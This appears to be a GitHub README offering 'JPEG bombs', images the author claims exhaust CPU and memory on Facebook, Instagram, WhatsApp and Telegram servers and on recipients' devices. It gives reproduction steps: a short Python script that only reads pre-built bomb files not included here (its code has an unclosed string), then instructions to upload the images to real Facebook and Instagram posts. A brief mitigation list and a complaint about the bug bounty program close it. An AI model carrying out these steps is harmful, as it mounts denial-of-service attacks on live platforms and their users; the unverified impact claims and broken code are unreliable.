# jpeg-bombs
simple ac-vulnurabilty exploits for which facebook refused to pay me a bounty
they are highly cpu/ram strainful and work both on fb and instegram and whatsapp without any detection, causing huge server side strain on both fb/instegram/wapp and even telgram  and any user who opens it / to whom it is sent to - it is cauysed because of the image handler fb and similar sites use, as of this date still isnt fixed, by me pablo rotem.
use at your own risk.]\
i am not reponsible for any damage -only sharing for anyone who might benefit from this in terms of security patching
and a personal advice - do not try to go to fb bounty program as they will not pay any bounty if they can tag it as ddos - this atack is anything but ddos - but its an advice - you can try and post future vulnurabilites and youll see the reposnse you ll get from fb security team..
i believe the reason for that is fb security employess simply do not wish to tell their employers they did a poor job - thus putting all their users ar risk instead of paying a bounty...
steps to reproduce : 
1. to create an ac atack - open the terminal and simply run the following after saving it as a file  to create these image bombs:
[notice the size is a nother major risk as if an atacker would alter the repeat steps - the impact would be much higher in exhation of higher memory and cpu.
here are the actual files youd need to build such a bomb :]
filename - jpeg_bomb.py
paste in that file the following : 


from options import Options
import os
options = Options()
options.add_option('size', 10, 'Size of decompressed JPEG in KB', list(range(10, 61, 10)))
options.add_option('color', 'gray', 'color scale', ['gray', 'rgb'])
Explanation = 'Produces JPEG compression bomb for given size and color scale.' \
'\n\n ' \
'JPEG bombs of certain sizes will be output.
NO_INPUT = True
DEFAULT_OUTPUT = 'file'
DEFAULT_OUTPUT_OPTIONS = {
'final_newline': False,
'format': 'binary'
}
def run(output):
size = str(options['size'])
color = options['color']
with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'jpeg_bombs', color, size + 'K.jpeg'), 'rb') as f:
output.output([f.read()])
[
i cannot add the additional files needed to reproduce but i believe any security newbie will hae no trouble to guess... (i just dont wnat to be sued..) 
]
3. upload the produced image in any fb post/page/group/instegram and youll be ably to see the server side effct on the server!

4.this is an AC time attack as well as an ac disk/space atack and a CPU (AC time) vulnerability against the jpeg parser without going over any given memory ceiling
ill atch the entire source code which i havent yet shared on guithub in the future -but want to give fb a chance to fix it.
the source in the folders include the actual binaries so dowload with care as they can crash low memomry laptops / cpus and most smartphones!!
the fix ---
-----------
1.limit the max memory per image uplaod.
2. Input sanitization:
3. Don’t allow repeated filters
4 Limit the number of DCTDecode object per page
5.limit the number of any other jpeg deflate parser so it limits repeated objects in binary code or sanitize better repteaded field or empty files large in size

![Alt text](/fb-response.png?raw=true "The fb response i got")
